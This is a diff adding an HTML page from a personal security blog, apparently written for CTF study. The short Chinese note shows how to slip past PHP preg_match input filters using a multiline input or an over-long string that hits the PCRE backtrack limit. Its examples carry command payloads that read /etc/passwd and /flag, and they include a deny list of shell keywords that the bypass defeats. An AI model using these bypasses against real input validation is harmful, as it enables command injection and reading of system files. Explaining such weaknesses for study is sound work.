@@ -1,0 +1,225 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP Trick 之 preg_match(/^.*/) | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP Trick 之 preg_match(/^.*/) | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+I hate Regex
+
+快速笔记
+换行绕过
+如果preg_match用^对开头进行界定的话，那么它只会为输入的第一行进行检测，进而可以通过输入多行进行绕过：
+&lt;?php
+$myinput=&quot;aaaaaaa\n11111..." />
+    <meta name="keywords" content="正则表达式,PHP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP Trick 之 preg_match(/^.*/)
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-02
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/2BF5JJMZu/" class="post-tag">
+                  # 正则表达式
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/8uAawjb9S/" class="post-tag">
+                  # PHP
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/php-trick-zhi-preg_match.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>I hate Regex</p>
+</blockquote>
+<p>快速笔记</p>
+<h1 id="换行绕过">换行绕过</h1>
+<p>如果<code>preg_match</code>用<code>^</code>对开头进行界定的话，那么它只会为输入的第一行进行检测，进而可以通过输入多行进行绕过：</p>
+<pre><code class="language-php">&lt;?php
+$myinput=&quot;aaaaaaa\n11111111&quot;; //Notice the new line
+echo preg_match(&quot;/1/&quot;,$myinput);
+//1  --&gt; In this scenario preg_match find the char &quot;1&quot;
+echo preg_match(&quot;/1.*$/&quot;,$myinput);
+//1  --&gt; In this scenario preg_match find the char &quot;1&quot;
+echo preg_match(&quot;/^.*1/&quot;,$myinput);
+//0  --&gt; In this scenario preg_match DOESN'T find the char &quot;1&quot;
+echo preg_match(&quot;/^.*1.*$/&quot;,$myinput);
+//0  --&gt; In this scenario preg_match DOESN'T find the char &quot;1&quot;
+</code></pre>
+<p>如果接收的是JSON格式的数据，可以多输入几行：</p>
+<pre><code class="language-json">{
+  &quot;cmd&quot;: &quot;cat /etc/passwd&quot;
+}
+</code></pre>
+<h1 id="长度绕过">长度绕过</h1>
+<p>这个的利用原理是pcre设定了一个正则匹配溯次数上限<code>pcre.backtrack_limit</code>，可以用<code>var_dump(ini_get('pcre.backtrack_limit'));</code>的方式查看当前环境下的上限：<br>
+<img src="https://skyblu3519.github.io/post-images/1688280760495.png" alt="" loading="lazy"></p>
+<p>通过发送超长字符串的方式，使正则执行失败，进而绕过限制。</p>
+<pre><code class="language-php">&lt;?php
+$json = '{&quot;cmd&quot;: &quot;cat /flag&quot;, &quot;injected&quot;: &quot;'. str_repeat(&quot;a&quot;, 10000000) .'&quot;}';
+//echo $json.&quot;\n&quot;;
+if (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'preg_match detected&lt;br/&gt;&lt;br/&gt;';
+} else {
+    $cmd = json_decode($json, true)['cmd'];
+    echo $cmd;  // cat /flag
+}
+</code></pre>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a><br>
+<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.">PHP Tricks!</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87">换行绕过</a></li>
+<li><a href="#%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87">长度绕过</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/ld_preload-rao-guo-disable_function/">
+              <h3 class="post-title">
+                LD_PRELOAD绕过disable_function
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
